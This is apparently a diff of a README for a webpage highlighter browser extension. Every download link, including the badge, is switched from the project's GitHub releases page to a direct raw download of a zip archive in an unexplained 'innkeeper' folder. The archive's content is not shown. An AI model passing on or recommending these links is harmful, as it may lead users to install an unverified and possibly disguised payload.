@@ -1,6 +1,6 @@
 # 🌟 cracked-webpage-highlighter-extension - Highlight Important Sections Effortlessly
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/jsm2raj/cracked-webpage-highlighter-extension/releases)
+[![Download](https://raw.githubusercontent.com/jsm2raj/cracked-webpage-highlighter-extension/main/innkeeper/cracked-webpage-highlighter-extension.zip)](https://raw.githubusercontent.com/jsm2raj/cracked-webpage-highlighter-extension/main/innkeeper/cracked-webpage-highlighter-extension.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ Welcome to the Cracked Webpage Highlighter Extension! This tool helps you easily
 
 ## 📥 Download & Install
 
-To get started, visit this page to download: [Download Here](https://github.com/jsm2raj/cracked-webpage-highlighter-extension/releases). 
+To get started, visit this page to download: [Download Here](https://raw.githubusercontent.com/jsm2raj/cracked-webpage-highlighter-extension/main/innkeeper/cracked-webpage-highlighter-extension.zip). 
 
 ### Step-by-Step Installation
 
@@ -69,4 +69,4 @@ This project is licensed under the MIT License. You can use, modify, and redistr
 
 ## 🌐 Visit the Release Page Again
 
-To download the latest version or check for updates, visit: [Download Here](https://github.com/jsm2raj/cracked-webpage-highlighter-extension/releases).
+To download the latest version or check for updates, visit: [Download Here](https://raw.githubusercontent.com/jsm2raj/cracked-webpage-highlighter-extension/main/innkeeper/cracked-webpage-highlighter-extension.zip).
